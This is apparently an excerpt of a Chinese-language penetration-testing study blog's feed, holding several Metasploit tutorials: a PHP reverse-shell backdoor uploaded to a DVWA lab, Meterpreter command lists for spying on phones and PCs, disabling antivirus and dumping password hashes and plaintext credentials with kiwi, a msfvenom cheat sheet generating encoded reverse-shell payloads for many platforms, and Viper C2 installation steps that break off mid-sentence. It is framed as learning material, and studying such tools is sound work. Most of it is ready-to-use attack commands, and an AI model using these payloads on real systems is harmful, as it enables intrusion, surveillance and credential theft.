post/windows/manage/enable_rdp</p></li><li><p>列举当前登录的用户：</p><p><code>run post/windows/gather/enum_logged_on_users</code></p></li><li><p>查看当前应用程序：run post/windows/gather/enum_applications</p></li><li><p>抓取目标机的屏幕截图：<code>load espia</code> ； <code>screengrab</code></p></li><li><p>抓取摄像头的照片：webcam_snap</p></li><li><p>查看当前处于目标机的那个目录：<code>pwd</code></p></li><li><p>查看当前攻击机目录：getlwd</p></li><li><p>查看屏幕：<code>run vnc</code></p></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/13-php-hou-men-fan-dan-lian-jie-yan-shi/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/13-php-hou-men-fan-dan-lian-jie-yan-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="一、-环境准备"><a href="#一、-环境准备" class="headerlink" title="一、 环境准备"></a>一、 环境准备</h1><h3 id="1-DVWA靶场"><a href="#1-DVWA靶场" class="headerlink" title="1 DVWA靶场"></a>1 DVWA靶场</h3><p>   DVWA下载：<a href="https://codeload.github.com/ethicalhack3r/DVWA/zip/master">https://codeload.github.com/ethicalhack3r/DVWA/zip/master</a></p><p>注意：配置DVWA环境 准备PHP7.0以上，和 Nginx环境<br>1 配置数据库密码  配置 config/config.inc.php.dist 文件（注意后门的 .dist要通过重命名删掉）<br>2 使用浏览器访问 <a href="http://192.168.70.130:8080/setup.php">http://192.168.70.130:8080/setup.php</a><br>3 红字问题解决<br>4 缺少<strong>key</strong>  直接替换下面2句  或者 访问<a href="https://www.google.com/recaptcha/admin/create">https://www.google.com/recaptcha/admin/create</a></p><pre class="line-numbers language-none"><code class="language-none">$_DVWA[ 'recaptcha_public_key' ] = '6LdJJlUUAAAAAH1Q6cTpZRQ2Ah8VpyzhnffD0mBb';$_DVWA[ 'recaptcha_private_key' ] = '6LdJJlUUAAAAAM2a3HrgzLczqdYp4g05EqDs-W4K';<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>5 allow_url_include: Disabled  提示没开启<br>找到php目录里的php.ini <strong>allow_url_include</strong>  将后面参数OFF 改成<strong>On</strong> 修改完成重启Nginx生效</p><h3 id="2-Metasploit任意平台"><a href="#2-Metasploit任意平台" class="headerlink" title="2 Metasploit任意平台"></a>2 Metasploit任意平台</h3><p>  可以是Windows版，可以是kali自带版</p><h1 id="二、Metasploit配置监控及攻击载荷"><a href="#二、Metasploit配置监控及攻击载荷" class="headerlink" title="二、Metasploit配置监控及攻击载荷"></a>二、Metasploit配置监控及攻击载荷</h1><h3 id="1-配置监控-使用handler模块"><a href="#1-配置监控-使用handler模块" class="headerlink" title="1 配置监控-使用handler模块"></a>1 配置监控-使用handler模块</h3><p><code>use exploit/multi/handler</code></p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641417576000/a2529fe010ac46108a0413b8153c08b0.png" alt="img" style="zoom:200%;"><h3 id="2-配置攻击载荷设置payload"><a href="#2-配置攻击载荷设置payload" class="headerlink" title="2 配置攻击载荷设置payload"></a>2 配置攻击载荷设置payload</h3><h4 id="第一步设置payload"><a href="#第一步设置payload" class="headerlink" title="第一步设置payload"></a>第一步设置payload</h4><p> <code>set payload php/meterpreter/reverse_tcp</code></p><h4 id="第二步设置-lhost-和-lport"><a href="#第二步设置-lhost-和-lport" class="headerlink" title="第二步设置 lhost 和 lport"></a>第二步设置 lhost 和 lport</h4><p> <code>set lhost 192.168.70.3</code></p><p><code>set lport  4444</code>端口</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641417576000/ad204b7bb1bc4c709f4d6948d4ef219a.png" alt="img"> </p><h3 id="3-生成php后门执行攻击获得meterpreter"><a href="#3-生成php后门执行攻击获得meterpreter" class="headerlink" title="3 生成php后门执行攻击获得meterpreter"></a>3 生成php后门执行攻击获得meterpreter</h3><h4 id="3-1生成PHP后门"><a href="#3-1生成PHP后门" class="headerlink" title="3.1生成PHP后门"></a>3.1生成PHP后门</h4><p><code>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.70.3 lport=4444 R&gt;shell.php</code></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641417576000/1fa4967afb3f487f84926004d4ddc591.png" alt="img"></p><h4 id="3-2-传播"><a href="#3-2-传播" class="headerlink" title="3.2 传播"></a>3.2 传播</h4><p>使用Python简单的web服务</p><p><code>python3 -m http.server 80</code></p><p>或</p><p><code>python -m SimpleHTTPServer 80</code></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641417576000/6604546c76d7471e9f332e81daf6c570.png" alt="img"></p><p>靶机将shell.php使用<strong>文件上传</strong>的方式上传</p><p>然后访问</p><p><code>192.168.70.130:8084/hackable/uploads/shell.php</code></p><p>触发运行。</p><h4 id="3-3-执行攻击获得meterpreter"><a href="#3-3-执行攻击获得meterpreter" class="headerlink" title="3.3 执行攻击获得meterpreter"></a>3.3 执行攻击获得meterpreter</h4><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641417576000/1003035b32a343488a282bddec48a62b.png" alt="img"></p><p><code>run</code> 或者<code>exploit</code></p><p>获取到meterpreter 我们就可以做渗透操作了</p><h5 id="观看屏幕"><a href="#观看屏幕" class="headerlink" title="观看屏幕"></a>观看屏幕</h5><p><code>run vnc</code></p><h5 id="查看当前账号"><a href="#查看当前账号" class="headerlink" title="查看当前账号"></a>查看当前账号</h5><p><code>getuid</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/12-meterpreter-jie-shao/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/12-meterpreter-jie-shao/</url>
      
        <content type="html"><![CDATA[<h1 id="一、-Meterpreter是什么"><a href="#一、-Meterpreter是什么" class="headerlink" title="一、 Meterpreter是什么"></a>一、 Meterpreter是什么</h1><p>Meterpreter是Metasploit框架中的一个利器，作为漏洞溢出后的<strong>攻击载荷</strong>使用，攻击载荷在触发漏洞后会返回一个由我们控制的通道，可用于远程执行命令!<br>Metasploit提供了各个主流平台的Meterpreter版本，包括Windows、Linux，同时支持x86、x64平台，另外，Meterpreter还提供了基于PHP和Java语言的实现。Meterpreter的工作模式是纯内存的，好处是启动隐藏，很难被杀毒软件监测到。不需要访问目标主机磁盘，所以也没什么入侵的痕迹。除上述外，Meterpreter还支持Ruby脚本形式的扩展。所以Ruby语言还很有必要了解下。</p><h1 id="二、Meterpreter中常用的反弹类型"><a href="#二、Meterpreter中常用的反弹类型" class="headerlink" title="二、Meterpreter中常用的反弹类型"></a>二、Meterpreter中常用的反弹类型</h1><p>1.reverse_tcp<br>这是一个基于TCP的反向链接反弹shell, 使用起来很稳定</p><h1 id="三、Meterpreter的常用命令"><a href="#三、Meterpreter的常用命令" class="headerlink" title="三、Meterpreter的常用命令"></a>三、Meterpreter的常用命令</h1><h2 id="1-基本命令"><a href="#1-基本命令" class="headerlink" title="1.基本命令"></a>1.基本命令</h2><p><code>help</code># 查看Meterpreter帮助</p><p><code>background</code>#返回，把meterpreter后台挂起<br><code>bgkill</code># 杀死一个 meterpreter 脚本<br><code>bglist</code>#提供所有正在运行的后台脚本的列表<br><code>bgrun</code>#作为一个后台线程运行脚本<br><code>channel</code>#显示活动频道<br><code>sessions -i number</code> # 与会话进行交互，number表示第n个session,使用session -i 连接到指定序号的meterpreter会话已继续利用<br><code>sesssions -k  number</code> #与会话进行交互<br><code>close</code># 关闭通道<br><code>exit</code># 终止 meterpreter 会话<br><code>quit</code># 终止 meterpreter 会话<br><code>interact id</code> #切换进一个信道<br> <code>run</code>#执行一个已有的模块，这里要说的是输入run后按两下tab，会列出所有的已有的脚本，常用的有autoroute,hashdump,arp_scanner,multi_meter_inject等<br> <code>irb</code># 进入 Ruby 脚本模式<br> <code>read</code># 从通道读取数据write# 将数据写入到一个通道<br> run和bgrun# 前台和后台执行以后它选定的 meterpreter 脚本<br><code>use</code># 加载 meterpreter 的扩展<br><code>load/use</code>#加载模块<br> <code>Resource</code>#执行一个已有的rc脚本</p><h2 id="2-常用命令"><a href="#2-常用命令" class="headerlink" title="2  常用命令"></a>2  常用命令</h2><h3 id="2-1-针对安卓手机的一些命令"><a href="#2-1-针对安卓手机的一些命令" class="headerlink" title="2.1 针对安卓手机的一些命令"></a>2.1 针对安卓手机的一些命令</h3><p>获取手机通讯录： <code>dump_contacts</code></p><p>获取短信记录：<code>dump_sms</code></p><p>控制实验手机发短信：<code>send_sms -d 15330252525 -t "hello"</code></p><p>获取实验手机GPS定位信息：<code>geolocate</code></p><p>获取实验手机Wi-Fi定位信息：<code>wlan_geolocate</code></p><p>控制实验手机录音：<code>record_mic -d  5</code></p><p>获取实验手机相机设备：<code>webcam_list</code></p><p>控制实验手机拍照 ：<code>webcam_snap</code></p><p>直播实验手机摄像头：<code>webcam_stream</code></p><h3 id="2-2-针对Windows的一些命令"><a href="#2-2-针对Windows的一些命令" class="headerlink" title="2.2 针对Windows的一些命令"></a>2.2 针对Windows的一些命令</h3><p>查看进程：<code>ps</code></p><p>查看当前进程号：<code>getpid</code></p><p>查看<strong>系统信息</strong>：<code>sysinfo</code></p><p>查看目标机是否为虚拟机：</p><p><code>run post/windows/gather/checkvm</code></p><p>查看完整网络设置：<code>route</code></p><p>查看<strong>当前权限</strong>：<code>getuid</code></p><p>自动提权：<code>getsystem</code></p><p>关闭杀毒软件：<code>run post/windows/manage/killav</code></p><p>启动远程桌面协议：<code>run post/windows/manage/enable_rdp</code></p><p>列举当前登录的用户：</p><p><code>run post/windows/gather/enum_logged_on_users</code></p><p>查看当前应用程序：</p><p><code>run post/windows/gather/enum_applications</code></p><p>抓取目标机的<strong>屏幕截图</strong>：<code>load espia</code> ； <code>screengrab</code></p><p>获取相机设备：<code>webcam_list</code></p><p>控制拍照 ：<code>webcam_snap</code></p><p><strong>直播摄像头</strong>：<code>webcam_stream</code></p><p> <strong>观看屏幕</strong>：<code>run vnc</code></p><p>控制录音：<code>record_mic</code></p><p>查看<strong>当前目录</strong>：<code>pwd</code></p><p>查看当前目录：<code>getlwd</code></p><p>导出<strong>当前用户密码哈希</strong>  <code>run hashdump</code></p><p>用户名：SID：LM哈希：NTLM哈希:::</p><p>也可以使用下面这个命令导出 权限更高   </p><p><code>run windows/gather/smart_hashdump</code></p><p>抓取<strong>自动登录的用户名和密码</strong>  </p><p><code>run windows/gather/credentials/windows_autologin</code></p><p>直接获取明文密码（注意这个功能需要获取系统权限  获取系统权限需要输入getsystem）</p><p>首选终端输入  <code>load kiwi</code>    加载kiwi</p><p><code>creds_all</code>：列举所有凭据<br><code>creds_kerberos</code>：列举所有kerberos凭据<br><code>creds_msv</code>：列举所有msv凭据<br><code>creds_ssp</code>：列举所有ssp凭据<br><code>creds_tspkg</code>：列举所有tspkg凭据<br><code>creds_wdigest</code>：列举所有wdigest凭据<br><code>dcsync</code>：通过DCSync检索用户帐户信息<br><code>dcsync_ntlm</code>：通过DCSync检索用户帐户NTLM散列、SID和RID<br><code>golden_ticket_create</code>：创建黄金票据<br><code>kerberos_ticket_list</code>：列举kerberos票据<br><code>kerberos_ticket_purge</code>：清除kerberos票据<br><code>kerberos_ticket_use</code>：使用kerberos票据<br><code>kiwi_cmd</code>：执行mimikatz的命令，后面接mimikatz.exe的命令<br><code>lsa_dump_sam</code>：dump出lsa的SAM<br><code>lsa_dump_secrets</code>：dump出lsa的密文<br><code>password_change</code>：修改密码<br><code>wifi_list</code>：列出当前用户的wifi配置文件<br><code>wifi_list_shared</code>：列出共享wifi配置文件/编码</p><h2 id="3-文件系统命令"><a href="#3-文件系统命令" class="headerlink" title="3.文件系统命令"></a>3.文件系统命令</h2><p>cat c:\boot.ini#查看文件内容,文件必须存在<br>del c:\boot.ini #删除指定的文件<br>upload /root/Desktop/netcat.exe c:\ # 上传文件到目标机主上，如upload  setup.exe C:\windows\system32<br>download nimeia.txt /root/Desktop/   # 下载文件到本机上如：download C:\boot.ini /root/或者download C:\“ProgramFiles”\Tencent\QQ\Users\295****<em><em>125\Msg2.0.db /root/<br>edit c:\boot.ini  # 编辑文件<br>getlwd#打印本地目录<br>getwd#打印工作目录<br>lcd#更改本地目录<br>ls#列出在当前目录中的文件列表<br>lpwd#打印本地目录<br>pwd#输出工作目录<br>cd c:\ #进入目录文件下<br>rm file #删除文件<br>mkdir dier #在受害者系统上的创建目录<br>rmdir#受害者系统上删除目录<br>dir#列出目标主机的文件和文件夹信息<br>mv#修改目标主机上的文件名<br>search -d d:\www -f web.config #search 文件，如search  -d c:\  -f</em>.doc<br>meterpreter &gt; search -f autoexec.bat  #搜索文件<br>meterpreter &gt; search -f sea</em>.bat c:\xamp\<br>enumdesktops     #用户登录数</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/08-09-msfvenom-chang-yong-can-shu/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/08-09-msfvenom-chang-yong-can-shu/</url>
      
        <content type="html"><![CDATA[<p>Kali中的 <code>msfvenom</code> 取代了msfpayload和msfencode，常用于生成后门木马</p><p>msfpayload是MSF攻击荷载生成器，用于生成shellcode和可执行代码。<br>msfencode是MSF编码器。</p><hr><h1 id="一-、msfvenom-常用参数"><a href="#一-、msfvenom-常用参数" class="headerlink" title="一 、msfvenom 常用参数"></a>一 、msfvenom 常用参数</h1><p><code>-l</code><br>列出指定模块的所有可用资源,模块类型包括: payloads, encoders, nops, all</p><p><code>-p</code><br>指定需要使用的payload(<strong>攻击荷载</strong>)。</p><p><code>-f</code><br>指定<strong>输出格式</strong></p><p>Executable formats:Asp、aspx、aspx-exe、axis2、dll、elf、elf-so、exe、exe-only、exe-service、exe-smallhta-psh、jar、jsp、loop-vbs、macho、msi、msi-nouac、osx-app、psh、psh-cmd、psh-net、psh-reflection、python-reflection、vba、vba-exe、vba-psh、vbs、war；</p><p>Transform formats:base32、base64、bash、c、csharp、dw、dword、hex、java、js_be、js_le、num、perl、pl、powershell、ps1、py、python、raw、rb、ruby、sh、vbapplication、vbscript；</p><p><code>-e</code><br>指定需要使用的encoder（编码器）<strong>编码免杀</strong>。</p><p><code>-a</code><br>指定payload的<strong>目标架构</strong></p><p>选择架构平台:x86 | x64 | x86_64<br><strong>Platforms</strong>:windows, netware, android, java, ruby, linux, cisco, solaris, osx, bsd, openbsd, bsdi, netbsd, freebsd, aix, hpux, irix, unix, php, javascript, python, nodejs, firefox, mainframe</p><p><code>-o</code><br><strong>保存</strong>payload文件输出。</p><p><code>-b</code><br>设定<strong>规避字符集</strong>，比如: ‘\x00\xff’避免使用的字符</p><p><code>-n</code><br>为payload预先指定一个NOP<strong>滑动长度</strong></p><p><code>-s</code><br>设定有效攻击荷载的<strong>最大长度</strong>生成payload的最大长度，就是文件大小。</p><p><code>-i</code><br>指定payload的<strong>编码次数</strong></p><p><code>-c</code><br>指定一个<strong>附加</strong>的win32 shellcode<strong>文件</strong></p><p><code>-x</code><br>指定一个自定义的可执行文件作为模板<br>例如：原先有个正常文件normal.exe 可以通过这个选项把后门<strong>捆绑到</strong>这个<strong>程序</strong>上面。</p><p><code>-k</code><br>保护模板程序的动作，注入的payload作为一个新的进程运行<br>例如：原先有个正常文件normal.exe 可以通过这个选项把后门<strong>捆绑到这个程序</strong>上面。</p><p><code>-v</code><br>指定一个<strong>自定义的变量</strong>，以确定输出格式</p><hr><h1 id="二、各平台生成payload命令"><a href="#二、各平台生成payload命令" class="headerlink" title="二、各平台生成payload命令"></a>二、各平台生成payload命令</h1><hr><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><pre class="line-numbers language-none"><code class="language-none">msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.70.3 LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\xff' -i 10  -f exe -o payload.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>目标框架x86,平台windows,攻击载荷windows/meterpreter/reverse_tcp,监听主机192.168.70.3，端口4444，免杀编码x86/shikata_ga_nai，规避字符集’\x00\x0a\xff’，编码10次，输出exe文件，输出文件名叫payload.exe。</p><p>简易的：</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.70.3 lport=4444 -f exe &gt;shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h2><pre class="line-numbers language-none"><code class="language-none">msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=192.168.70.3 LPORT=4444 -f macho -o payload.macho<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h2><pre class="line-numbers language-none"><code class="language-none">msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4567  -o payload.apk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h2><pre class="line-numbers language-none"><code class="language-none">msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=192.168.1.1 LPORT=8888 -e cmd/powershell_base64 -i 3 -f raw -o payload.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><pre class="line-numbers language-none"><code class="language-none">msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.70.3 LPORT=4567 -f elf -o payload.elf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><pre class="line-numbers language-none"><code class="language-none">msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.1  LPORT=8888  -f raw &gt; shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="aspx"><a href="#aspx" class="headerlink" title="aspx"></a>aspx</h2><pre class="line-numbers language-none"><code class="language-none">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=8888 -f aspx -o payload.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h2><pre class="line-numbers language-none"><code class="language-none">msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=192.168.1.1  LPORT=4567 -f raw -o payload.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="war"><a href="#war" class="headerlink" title="war"></a>war</h2><pre class="line-numbers language-none"><code class="language-none">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f raw - o payload.war<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h2><pre class="line-numbers language-none"><code class="language-none">msfvenom -p nodejs/shell_reverse_tcp LHOST=192.168.1.1  LPORT=4567 -f raw -o payload.js<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><pre class="line-numbers language-none"><code class="language-none">msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.1  LPORT=4567 -f raw -o payload.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h2><pre class="line-numbers language-none"><code class="language-none">msfvenom -p cmd/unix/reverse_perl LHOST=192.168.1.1  LPORT=4567 -f raw -o payload.pl<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h2><pre class="line-numbers language-none"><code class="language-none">msfvenom -p ruby/shell_reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f raw -o payload.rb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="lua"><a href="#lua" class="headerlink" title="lua"></a>lua</h2><pre class="line-numbers language-none"><code class="language-none">msfvenom -p cmd/unix/reverse_lua LHOST=192.168.1.1 LPORT=4567 -f raw -o payload.lua<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="windows-shellcode"><a href="#windows-shellcode" class="headerlink" title="windows shellcode"></a>windows shellcode</h2><pre class="line-numbers language-none"><code class="language-none">msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="linux-shellcode"><a href="#linux-shellcode" class="headerlink" title="linux shellcode"></a>linux shellcode</h2><pre class="line-numbers language-none"><code class="language-none">msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.70.3 LPORT=4567 -f c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="mac-shellcode"><a href="#mac-shellcode" class="headerlink" title="mac shellcode"></a>mac shellcode</h2><pre class="line-numbers language-none"><code class="language-none">msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp  LHOST=192.168.1.1  LPORT=4567 -f c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/07-metasploit-de-he-xin-mo-kuai-modules/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/07-metasploit-de-he-xin-mo-kuai-modules/</url>
      
        <content type="html"><![CDATA[<p>msf的模块都放在</p><p>/usr/share/metasploit-framework/modules/这个目录下</p><p><code>cd /usr/share/metasploit-framework/modules/</code></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1640748958000/9e03e3c4dbc548d7b38c0389b1f131ab.png" alt="image.png"></p><p>1 <code>auxiliary</code>:辅助模块，辅助渗透(端口扫描、登录密码爆破、漏洞验证等)</p><p>2 <code>exploits</code>:漏洞利用模块，包含主流的漏洞利用脚本，通常是对某些可能存在漏洞的目标进行漏洞利用。</p><p>3 <code>payloads</code>:攻击载荷，主要是攻击成功后在目标机器执行的代码,比如反弹shell的代码</p><p>4 <code>post</code>:后渗透阶段模块，漏洞利用成功获得meterpreter之后， 向目标发送的一些功能性指令,如:提权等</p><p>5 <code>encoders</code>: 编码器模块，主要包含各种编码工具，对payload进行编码加密，以便绕过入侵检测和过滤系统</p><p>6 <code>evasion</code>:躲避模块，用来生成免杀payload</p><p>7 <code>nops</code>:这里主要放着调整shellcode 前置nop指令长度的工具（不理解没关系）</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/06-msf-mu-lu-jie-gou/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/06-msf-mu-lu-jie-gou/</url>
      
        <content type="html"><![CDATA[<h1 id="MSF目录结构"><a href="#MSF目录结构" class="headerlink" title="MSF目录结构"></a>MSF目录结构</h1><p>kali终端中输</p><p><code>cd /usr/share/metasploit-framework</code></p><p>然后输入 <code>ls</code> 查看</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639971401000/1abfa994573e4ec1b283aea5ecb809d3.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639971401000/13fa9f11a9b540f7a15854b67186ae99.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639971401000/15e181b7c7534f549cbbcb249121acb5.png" alt="image.png"></p><h1 id="要记住的一些模块"><a href="#要记住的一些模块" class="headerlink" title="要记住的一些模块"></a>要记住的一些模块</h1><p><code>modules</code>：目录里面存放渗透使用的  辅助模块;编码模块;利用模块;攻击载荷;后渗透模块…</p><p><code>plugins</code>： 这个模块需要用load加载，主要提供数据库连接插件 和 各种要用到的插件。</p><p><code>tools</code>：包含一些有用的脚本和零散的工具。</p><p><code>scripts</code>：目录里面存放都是meterpreter利用的脚本。</p><p><code>db</code>：数据放在这个目录里</p><p><code>data</code>：存放使用到的文件，比如密码字典、meterpreter、passivex、vnc、dlls等工具和一些用户接口代码，msfweb和一些其他模块用到的数据文件</p><p><code>lib</code>：库文件都保存在这个目录里</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/05-msf-tu-xing-jie-mian-viper/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/05-msf-tu-xing-jie-mian-viper/</url>
      
        <content type="html"><![CDATA[<p><strong>MSF图形化界面Viper(炫彩蛇)下载与使用</strong></p><p>Viper是一款图形化内网渗透工具,将内网渗透过程中常用的战术及技术进行模块化及武器化.</p><p>集成杀软绕过,内网隧道,文件管理,命令行等基础功能.</p><p>当前已集成70+个模块,覆盖初始访问/持久化/权限提升/防御绕过/凭证访问/信息收集/横向移动等大类.</p><p><strong>在Kali Linux上安装Docker</strong></p><pre class="line-numbers language-none"><code class="language-none">apt-get update#使用apt安装docker apt-get install -y docker.io #设置开机启动 systemctl start docker#检查启动状态 docker version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​              </p><p><img src="MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper.assets/1640043246556.png" alt="1640043246556"></p><p> <strong>安装docker-compose</strong></p><pre class="line-numbers language-none"><code class="language-none">curl -L https://get.daocloud.io/docker/compose/releases/download/1.25.5/docker-compose-`uname -s`-`uname -m` &gt; /usr/bin/docker-compose#给赋可执行状态 chmod +x /usr/bin/docker-compose<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper.assets/1640043297604.png" alt="1640043297604"></p><pre class="line-numbers language-none"><code class="language-none">#设置安装目录export VIPER_DIR=/root/VIPER#执行如下命名生成安装目录,并进入安装目录 mkdir -p $VIPER_DIR &amp;&amp; cd $VIPER_DIR<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​              </p><p><img src="MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper.assets/1640043341743.png" alt="1640043341743"></p><p><strong>执行如下命令生成docker-compose.yml</strong></p><p>如果你看到的命令是乱的  <a href="https://note.youdao.com/s/GdzSJnWD">https://note.youdao.com/s/GdzSJnWD</a>  看这个文档</p><pre class="line-numbers language-none"><code class="language-none">tee docker-compose.yml &lt;&lt;-'EOF'version: "3"services:  viper:  image: registry.cn-shenzhen.aliyuncs.com/toys/viper:latest    container_name: viper-c    network_mode: "host"    restart: always    volumes:      - ${PWD}/loot:/root/.msf4/loot      - ${PWD}/db:/root/viper/Docker/db      - ${PWD}/module:/root/viper/Docker/module      - ${PWD}/log:/root/viper/Docker/log      - ${PWD}/nginxconfig:/root/viper/Docker/nginxconfig    command: ["VIPER_PASSWORD"]EOF<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​              </p><p><img src="MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper.assets/1640043385926.png" alt="1640043385926"></p><p><strong>设置登录密码</strong></p><p>Viper不允许使用默认密码,diypassword替换为自定义密码密码</p><pre class="line-numbers language-none"><code class="language-none">export VIPER_PASSWORD=root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​              </p><p><img src="MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper.assets/1640043439186.png" alt="1640043439186"></p><p><strong>写入密码到docker-compose.yml</strong></p><pre class="line-numbers language-none"><code class="language-none">sed -i "s/VIPER_PASSWORD/$VIPER_PASSWORD/g" docker-compose.yml#使用命令查看一下配置 cat docker-compose.yml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>​                </p><p><img src="MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper.assets/1640043478861.png" alt="1640043478861"></p><p><strong>创建启动Viper</strong></p><pre class="line-numbers language-none"><code class="language-none">cd $VIPER_DIRdocker-compose up -d #或者#启动viperdocker-compose start    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>启动Viper 时，执行</p><p>docker-compose up -d</p><p>会遇到“ERROR: Get “<a href="https://registry.cn-shenzhen.aliyuncs.com/v2/">https://registry.cn-shenzhen.aliyuncs.com/v2/</a>“: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting 